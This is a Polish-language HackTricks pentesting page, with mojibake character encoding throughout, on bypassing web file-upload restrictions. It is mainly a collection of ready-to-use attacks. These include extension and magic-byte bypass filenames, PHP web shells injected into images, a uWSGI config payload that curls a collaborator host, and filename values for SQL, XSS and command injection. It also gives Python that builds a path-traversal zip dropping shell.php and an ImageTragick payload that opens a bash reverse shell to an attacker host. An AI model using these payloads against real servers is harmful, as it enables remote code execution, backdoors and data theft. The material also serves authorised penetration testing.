# File Upload

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

JeÅ›li jesteÅ› zainteresowany **karierÄ… w hacking** i chcesz zÅ‚amaÄ‡ to, co nie do zÅ‚amania - **zatrudniamy!** (_wymagana biegÅ‚a znajomoÅ›Ä‡ polskiego w mowie i piÅ›mie_).

{% embed url="https://www.stmcyber.com/careers" %}

## OgÃ³lna metodologia przesyÅ‚ania plikÃ³w

Inne przydatne rozszerzenia:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **DziaÅ‚a w PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ObejÅ›cie kontroli rozszerzeÅ„ plikÃ³w

1. JeÅ›li majÄ… zastosowanie, **sprawdÅº** **poprzednie rozszerzenia.** Testuj je rÃ³wnieÅ¼ uÅ¼ywajÄ…c duÅ¼ych liter: _pHp, .pHP5, .PhAr ..._
2. _SprawdÅº **dodanie waÅ¼nego rozszerzenia przed** rozszerzeniem wykonawczym (uÅ¼yj rÃ³wnieÅ¼ poprzednich rozszerzeÅ„):_
* _file.png.php_
* _file.png.Php5_
3. SprÃ³buj dodaÄ‡ **znaki specjalne na koÅ„cu.** MoÅ¼esz uÅ¼yÄ‡ Burp do **bruteforce** wszystkich **znakÃ³w ascii** i **Unicode**. (_ZauwaÅ¼, Å¼e moÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uÅ¼yÄ‡ **wczeÅ›niej** wspomnianych **rozszerzeÅ„**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. SprÃ³buj obejÅ›Ä‡ zabezpieczenia **oszukujÄ…c parser rozszerzeÅ„** po stronie serwera za pomocÄ… technik takich jak **podwajanie** **rozszerzenia** lub **dodawanie Å›mieci** danych (**bajty** null) miÄ™dzy rozszerzeniami. _MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **wczeÅ›niejszych rozszerzeÅ„** do przygotowania lepszego Å‚adunku._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodaj **kolejnÄ… warstwÄ™ rozszerzeÅ„** do poprzedniego sprawdzenia:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. SprÃ³buj umieÅ›ciÄ‡ **rozszerzenie exec przed waÅ¼nym rozszerzeniem** i miej nadziejÄ™, Å¼e serwer jest Åºle skonfigurowany. (przydatne do wykorzystania bÅ‚Ä™dÃ³w konfiguracyjnych Apache, gdzie wszystko z rozszerzeniem **.php**, ale **niekoniecznie koÅ„czÄ…ce siÄ™ na .php** bÄ™dzie wykonywaÄ‡ kod):
* _ex: file.php.png_
7. UÅ¼ywanie **NTFS alternate data stream (ADS)** w **Windows**. W tym przypadku, znak dwukropka â€œ:â€ zostanie wstawiony po zabronionym rozszerzeniu i przed dozwolonym. W rezultacie, **pusty plik z zabronionym rozszerzeniem** zostanie utworzony na serwerze (np. â€œfile.asax:.jpgâ€). Ten plik moÅ¼e byÄ‡ pÃ³Åºniej edytowany za pomocÄ… innych technik, takich jak uÅ¼ycie jego krÃ³tkiej nazwy pliku. WzÃ³r â€œ**::$data**â€ moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼yty do tworzenia plikÃ³w niepustych. Dlatego dodanie znaku kropki po tym wzorze moÅ¼e byÄ‡ rÃ³wnieÅ¼ przydatne do obejÅ›cia dalszych ograniczeÅ„ (np. â€œfile.asp::$data.â€)
8. SprÃ³buj zÅ‚amaÄ‡ limity nazw plikÃ³w. WaÅ¼ne rozszerzenie zostaje obciÄ™te. A zÅ‚oÅ›liwy PHP zostaje. AAA<--SNIP-->AAA.php

```
# Maksymalnie 255 bajtÃ³w w Linux
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 tutaj i dodanie .png
# PrzeÅ›lij plik i sprawdÅº odpowiedÅº, ile znakÃ³w pozwala. Powiedzmy 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# StwÃ³rz Å‚adunek
AAA<--SNIP 232 A-->AAA.php.png
```

### ObejÅ›cie kontroli Content-Type, Magic Number, kompresji i zmiany rozmiaru

* ObejÅ›cie kontroli **Content-Type** poprzez ustawienie **wartoÅ›ci** nagÅ‚Ã³wka **Content-Type** na: _image/png_, _text/plain_, application/octet-stream_
1. Lista sÅ‚Ã³w kluczowych **Content-Type**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
* ObejÅ›cie kontroli **magic number** poprzez dodanie na poczÄ…tku pliku **bajtÃ³w prawdziwego obrazu** (zmylenie komendy _file_). Lub wprowadzenie powÅ‚oki do **metadanych**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub moÅ¼esz rÃ³wnieÅ¼ **wprowadziÄ‡ Å‚adunek bezpoÅ›rednio** w obrazie:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* JeÅ›li **kompresja jest dodawana do twojego obrazu**, na przykÅ‚ad przy uÅ¼yciu niektÃ³rych standardowych bibliotek PHP, takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), wczeÅ›niejsze techniki nie bÄ™dÄ… przydatne. MoÅ¼esz jednak uÅ¼yÄ‡ **techniki PLTE chunk** [**zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), aby wstawiÄ‡ tekst, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Strona internetowa moÅ¼e rÃ³wnieÅ¼ **zmieniaÄ‡ rozmiar** **obrazu**, uÅ¼ywajÄ…c na przykÅ‚ad funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. MoÅ¼esz jednak uÅ¼yÄ‡ **techniki IDAT chunk** [**zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), aby wstawiÄ‡ tekst, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* InnÄ… technikÄ… do stworzenia Å‚adunku, ktÃ³ry **przetrwa zmianÄ™ rozmiaru obrazu**, jest uÅ¼ycie funkcji PHP-GD `thumbnailImage`. MoÅ¼esz jednak uÅ¼yÄ‡ **techniki tEXt chunk** [**zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), aby wstawiÄ‡ tekst, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Inne sztuczki do sprawdzenia

* ZnajdÅº lukÄ™, aby **zmieniÄ‡ nazwÄ™** juÅ¼ przesÅ‚anego pliku (aby zmieniÄ‡ rozszerzenie).
* ZnajdÅº lukÄ™ **Local File Inclusion**, aby wykonaÄ‡ backdoora.
* **MoÅ¼liwe ujawnienie informacji**:
1. PrzeÅ›lij **wielokrotnie** (i w **tym samym czasie**) **ten sam plik** z **tÄ… samÄ… nazwÄ…**
2. PrzeÅ›lij plik z **nazwÄ…** pliku lub **folderu**, ktÃ³ry **juÅ¼ istnieje**
3. PrzesyÅ‚anie pliku z **â€œ.â€, â€œ..â€, lub â€œâ€¦â€ jako jego nazwÄ…**. Na przykÅ‚ad, w Apache w **Windows**, jeÅ›li aplikacja zapisuje przesÅ‚ane pliki w katalogu â€œ/www/uploads/â€, nazwa pliku â€œ.â€ utworzy plik o nazwie â€œuploadsâ€ w katalogu â€œ/www/â€.
4. PrzeÅ›lij plik, ktÃ³ry moÅ¼e byÄ‡ trudny do usuniÄ™cia, taki jak **â€œâ€¦:.jpgâ€** w **NTFS**. (Windows)
5. PrzeÅ›lij plik w **Windows** z **nieprawidÅ‚owymi znakami**, takimi jak `|<>*?â€` w jego nazwie. (Windows)
6. PrzeÅ›lij plik w **Windows** uÅ¼ywajÄ…c **zarezerwowanych** (**zabronionych**) **nazw**, takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
* SprÃ³buj rÃ³wnieÅ¼ **przesÅ‚aÄ‡ plik wykonywalny** (.exe) lub **.html** (mniej podejrzany), ktÃ³ry **wykona kod**, gdy zostanie przypadkowo otwarty przez ofiarÄ™.

### Sztuczki ze specjalnymi rozszerzeniami

JeÅ›li prÃ³bujesz przesÅ‚aÄ‡ pliki na **serwer PHP**, [zobacz sztuczkÄ™ **.htaccess** do wykonania kodu](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
JeÅ›li prÃ³bujesz przesÅ‚aÄ‡ pliki na **serwer ASP**, [zobacz sztuczkÄ™ **.config** do wykonania kodu](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` sÄ… jak `.jar` dla javy, ale dla php, i mogÄ… byÄ‡ **uÅ¼ywane jak plik php** (wykonujÄ…c je za pomocÄ… php lub wÅ‚Ä…czajÄ…c je do skryptu...)

Rozszerzenie `.inc` jest czasami uÅ¼ywane dla plikÃ³w php, ktÃ³re sÄ… uÅ¼ywane tylko do **importowania plikÃ³w**, wiÄ™c w pewnym momencie ktoÅ› mÃ³gÅ‚ pozwoliÄ‡ na **wykonywanie tego rozszerzenia**.

## **Jetty RCE**

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik XML na serwer Jetty, moÅ¼esz uzyskaÄ‡ [RCE, poniewaÅ¼ **nowe \*.xml i \*.war sÄ… automatycznie przetwarzane**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Jak wspomniano na poniÅ¼szym obrazku, przesyÅ‚aj plik XML do `$JETTY_BASE/webapps/` i oczekuj powÅ‚oki!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

Aby szczegÃ³Å‚owo zbadaÄ‡ tÄ™ lukÄ™, sprawdÅº oryginalne badania: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Luki w zdalnym wykonywaniu poleceÅ„ (RCE) mogÄ… byÄ‡ wykorzystywane na serwerach uWSGI, jeÅ›li ma siÄ™ moÅ¼liwoÅ›Ä‡ modyfikacji pliku konfiguracyjnego `.ini`. Pliki konfiguracyjne uWSGI wykorzystujÄ… specyficznÄ… skÅ‚adniÄ™ do wÅ‚Ä…czania "magicznych" zmiennych, miejsc i operatorÃ³w. SzczegÃ³lnie potÄ™Å¼ny jest operator '@', uÅ¼ywany jako `@(filename)`, zaprojektowany do wÅ‚Ä…czania zawartoÅ›ci pliku. WÅ›rÃ³d rÃ³Å¼nych obsÅ‚ugiwanych schematÃ³w w uWSGI, schemat "exec" jest szczegÃ³lnie potÄ™Å¼ny, pozwalajÄ…c na odczyt danych z standardowego wyjÅ›cia procesu. Ta funkcja moÅ¼e byÄ‡ manipulowana w celach niecnych, takich jak zdalne wykonywanie poleceÅ„ lub dowolne zapisywanie/odczytywanie plikÃ³w, gdy plik konfiguracyjny `.ini` jest przetwarzany.

RozwaÅ¼ nastÄ™pujÄ…cy przykÅ‚ad szkodliwego pliku `uwsgi.ini`, pokazujÄ…cego rÃ³Å¼ne schematy:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie Å‚adunku nastÄ™puje podczas analizy pliku konfiguracyjnego. Aby konfiguracja mogÅ‚a zostaÄ‡ aktywowana i przeanalizowana, proces uWSGI musi zostaÄ‡ zrestartowany (potencjalnie po awarii lub z powodu ataku typu Denial of Service) lub plik musi byÄ‡ ustawiony na automatyczne przeÅ‚adowanie. Funkcja automatycznego przeÅ‚adowania, jeÅ›li jest wÅ‚Ä…czona, przeÅ‚adowuje plik w okreÅ›lonych odstÄ™pach czasu po wykryciu zmian.

Kluczowe jest zrozumienie luÅºnej natury analizy pliku konfiguracyjnego uWSGI. W szczegÃ³lnoÅ›ci omawiany Å‚adunek moÅ¼e byÄ‡ wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo poszerza zakres potencjalnej eksploatacji.

## **wget File Upload/SSRF Trick**

W niektÃ³rych przypadkach moÅ¼esz zauwaÅ¼yÄ‡, Å¼e serwer uÅ¼ywa **`wget`** do **pobierania plikÃ³w** i moÅ¼esz **wskazaÄ‡** **URL**. W takich przypadkach kod moÅ¼e sprawdzaÄ‡, czy rozszerzenie pobieranych plikÃ³w znajduje siÄ™ na liÅ›cie dozwolonych, aby upewniÄ‡ siÄ™, Å¼e tylko dozwolone pliki bÄ™dÄ… pobierane. Jednak **to sprawdzenie moÅ¼na obejÅ›Ä‡.**\
Maksymalna dÅ‚ugoÅ›Ä‡ **nazwy pliku** w **linux** wynosi **255**, jednak **wget** skraca nazwy plikÃ³w do **236** znakÃ³w. MoÅ¼esz **pobraÄ‡ plik o nazwie "A"\*232+".php"+".gif"**, ta nazwa pliku **obejdzie** **sprawdzenie** (poniewaÅ¼ w tym przykÅ‚adzie **".gif"** jest **waÅ¼nym** rozszerzeniem), ale `wget` **zmieni nazwÄ™** pliku na **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
ZauwaÅ¼, Å¼e **innÄ… opcjÄ…**, o ktÃ³rej moÅ¼esz myÅ›leÄ‡, aby obejÅ›Ä‡ tÄ™ kontrolÄ™, jest **przekierowanie serwera HTTP do innego pliku**, wiÄ™c poczÄ…tkowy adres URL obejdzie kontrolÄ™, a nastÄ™pnie wget pobierze przekierowany plik z nowÄ… nazwÄ…. To **nie zadziaÅ‚a** **chyba Å¼e** wget jest uÅ¼ywany z **parametrem** `--trust-server-names`, poniewaÅ¼ **wget pobierze przekierowanÄ… stronÄ™ z nazwÄ… pliku wskazanÄ… w oryginalnym adresie URL**.

## NarzÄ™dzia

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) to potÄ™Å¼ne narzÄ™dzie zaprojektowane, aby wspieraÄ‡ PentesterÃ³w i ÅowcÃ³w BÅ‚Ä™dÃ³w w testowaniu mechanizmÃ³w przesyÅ‚ania plikÃ³w. Wykorzystuje rÃ³Å¼ne techniki bug bounty, aby uproÅ›ciÄ‡ proces identyfikacji i wykorzystywania luk, zapewniajÄ…c dokÅ‚adne oceny aplikacji internetowych.

## Od przesyÅ‚ania plikÃ³w do innych luk

* Ustaw **filename** na `../../../tmp/lol.png` i sprÃ³buj osiÄ…gnÄ…Ä‡ **przechodzenie Å›cieÅ¼ki**
* Ustaw **filename** na `sleep(10)-- -.jpg` i moÅ¼esz byÄ‡ w stanie osiÄ…gnÄ…Ä‡ **SQL injection**
* Ustaw **filename** na `<svg onload=alert(document.domain)>`, aby osiÄ…gnÄ…Ä‡ XSS
* Ustaw **filename** na `; sleep 10;`, aby przetestowaÄ‡ niektÃ³re wstrzykniÄ™cia poleceÅ„ (wiÄ™cej [sztuczek wstrzykiwania poleceÅ„ tutaj](../command-injection.md))
* [**XSS** w przesyÅ‚aniu plikÃ³w obrazÃ³w (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** plik **upload** + **XSS** = [**Wykorzystanie Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE w przesyÅ‚aniu svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** poprzez przesyÅ‚anie pliku svg](../open-redirect.md#open-redirect-uploading-svg-files)
* SprÃ³buj **rÃ³Å¼nych Å‚adunkÃ³w svg** z [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [SÅ‚ynna **ImageTrick** luka](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* JeÅ›li moÅ¼esz **wskazaÄ‡ serwer WWW, aby pobraÅ‚ obraz z URL**, moÅ¼esz sprÃ³bowaÄ‡ wykorzystaÄ‡ [SSRF](../ssrf-server-side-request-forgery/). JeÅ›li ten **obraz** ma byÄ‡ **zapisany** na jakiejÅ› **publicznej** stronie, moÅ¼esz rÃ³wnieÅ¼ wskazaÄ‡ URL z [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukraÅ›Ä‡ informacje od kaÅ¼dego odwiedzajÄ…cego**.
* [**XXE i CORS** obejÅ›cie z przesyÅ‚aniem PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* Specjalnie przygotowane PDF-y do XSS: [nastÄ™pujÄ…ca strona przedstawia, jak **wstrzyknÄ…Ä‡ dane PDF, aby uzyskaÄ‡ wykonanie JS**](../xss-cross-site-scripting/pdf-injection.md). JeÅ›li moÅ¼esz przesyÅ‚aÄ‡ PDF-y, moÅ¼esz przygotowaÄ‡ PDF, ktÃ³ry wykona dowolny JS zgodnie z podanymi wskazÃ³wkami.
* PrzeÅ›lij zawartoÅ›Ä‡ \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)), aby sprawdziÄ‡, czy serwer ma jakikolwiek **antywirus**
* SprawdÅº, czy istnieje jakikolwiek **limit rozmiaru** podczas przesyÅ‚ania plikÃ³w

Oto lista 10 rzeczy, ktÃ³re moÅ¼esz osiÄ…gnÄ…Ä‡, przesyÅ‚ajÄ…c (z [tutaj](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Przechowywane XSS / SSRF / XXE
3. **GIF**: Przechowywane XSS / SSRF
4. **CSV**: WstrzykniÄ™cie CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : WstrzykniÄ™cie HTML / XSS / Otwarte przekierowanie
8. **PNG / JPEG**: Atak pixel flood (DoS)
9. **ZIP**: RCE poprzez LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Rozszerzenie Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magiczne bajty nagÅ‚Ã³wka

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Zobacz [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) dla innych typÃ³w plikÃ³w.

### Automatycznie dekompresowane przesyÅ‚anie plikÃ³w Zip/Tar

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ ZIP, ktÃ³ry ma byÄ‡ dekompresowany na serwerze, moÅ¼esz zrobiÄ‡ 2 rzeczy:

#### Symlink

PrzeÅ›lij link zawierajÄ…cy miÄ™kkie linki do innych plikÃ³w, a nastÄ™pnie, uzyskujÄ…c dostÄ™p do dekompresowanych plikÃ³w, uzyskasz dostÄ™p do powiÄ…zanych plikÃ³w:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Nieoczekiwane tworzenie plikÃ³w w katalogach podczas dekompresji jest istotnym problemem. Mimo poczÄ…tkowych zaÅ‚oÅ¼eÅ„, Å¼e ta konfiguracja moÅ¼e chroniÄ‡ przed wykonaniem poleceÅ„ na poziomie systemu operacyjnego poprzez zÅ‚oÅ›liwe przesyÅ‚anie plikÃ³w, hierarchiczne wsparcie dla kompresji i moÅ¼liwoÅ›ci przechodzenia przez katalogi formatu archiwum ZIP mogÄ… byÄ‡ wykorzystane. UmoÅ¼liwia to atakujÄ…cym obejÅ›cie ograniczeÅ„ i ucieczkÄ™ z bezpiecznych katalogÃ³w przesyÅ‚ania, manipulujÄ…c funkcjonalnoÅ›ciÄ… dekompresji docelowej aplikacji.

Zautomatyzowany exploit do tworzenia takich plikÃ³w jest dostÄ™pny na [**evilarc na GitHubie**](https://github.com/ptoomey3/evilarc). NarzÄ™dzie moÅ¼na uÅ¼ywaÄ‡ w sposÃ³b pokazany:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **sztuczka z symlinkiem z evilarc** jest opcjÄ…. JeÅ›li celem jest zaatakowanie pliku takiego jak `/flag.txt`, naleÅ¼y utworzyÄ‡ symlink do tego pliku w swoim systemie. Zapewnia to, Å¼e evilarc nie napotka bÅ‚Ä™dÃ³w podczas swojej pracy.

PoniÅ¼ej znajduje siÄ™ przykÅ‚ad kodu Python uÅ¼ywanego do stworzenia zÅ‚oÅ›liwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Wykorzystywanie kompresji do spryskiwania plikÃ³w**

Dalsze szczegÃ³Å‚y **znajdziesz w oryginalnym poÅ›cie w**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Tworzenie powÅ‚oki PHP**: Kod PHP jest napisany w celu wykonania poleceÅ„ przekazanych przez zmiennÄ… `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **Spryskiwanie plikÃ³w i tworzenie skompresowanego pliku**: Tworzone sÄ… wiele plikÃ³w, a nastÄ™pnie skÅ‚adany jest archiwum zip zawierajÄ…ce te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **Modyfikacja za pomocÄ… edytora hex lub vi**: Nazwy plikÃ³w wewnÄ…trz zip sÄ… zmieniane za pomocÄ… vi lub edytora hex, zmieniajÄ…c "xxA" na "../", aby przechodziÄ‡ miÄ™dzy katalogami.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

PrzeÅ›lij tÄ™ zawartoÅ›Ä‡ z rozszerzeniem obrazu, aby wykorzystaÄ‡ lukÄ™ **(ImageMagick , 7.0.1-1)** (z [eksploitu](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie powÅ‚oki PHP w PNG

Osadzanie powÅ‚oki PHP w kawaÅ‚ku IDAT pliku PNG moÅ¼e skutecznie omijaÄ‡ niektÃ³re operacje przetwarzania obrazÃ³w. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD sÄ… szczegÃ³lnie istotne w tym kontekÅ›cie, poniewaÅ¼ sÄ… powszechnie uÅ¼ywane do zmiany rozmiaru i prÃ³bkowania obrazÃ³w. ZdolnoÅ›Ä‡ osadzonej powÅ‚oki PHP do pozostawania nietkniÄ™tÄ… przez te operacje stanowi znacznÄ… zaletÄ™ w niektÃ³rych przypadkach uÅ¼ycia.

